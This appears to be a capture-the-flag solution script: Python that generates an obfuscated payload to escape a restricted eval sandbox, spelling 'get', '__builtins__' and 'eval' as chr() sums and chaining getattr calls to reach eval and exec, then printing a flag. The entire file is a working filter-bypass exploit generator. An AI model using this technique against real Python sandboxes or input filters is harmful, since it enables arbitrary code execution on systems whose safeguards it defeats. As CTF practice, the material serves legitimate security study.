def to_chrs(text):
    return '+'.join('chr(%d)' % ord(c) for c in text)

def _make_getattr_call(obj, attr):
    return 'getattr(*(list(%s for a in chr(1)) + list(%s for a in chr(1))))' % (obj, attr)

def make_exploit(code):
    get = to_chrs('get')
    builtins = to_chrs('__builtins__')
    eval = to_chrs('eval')
    code = to_chrs(code)
    return (_make_getattr_call(
                _make_getattr_call('globals()', '{get}') + '({builtins})',
                '{eval}') + '({code})').format(**locals())

exploit =  make_exploit("""exec('import os, sys;sys.stdout = sys.__stdout__;print("CSeC{Qu4ck_15_h1b3rn471ng}");sys.stdout = open(os.devnull, "w")')""")

print(exploit)
#eval(exploit)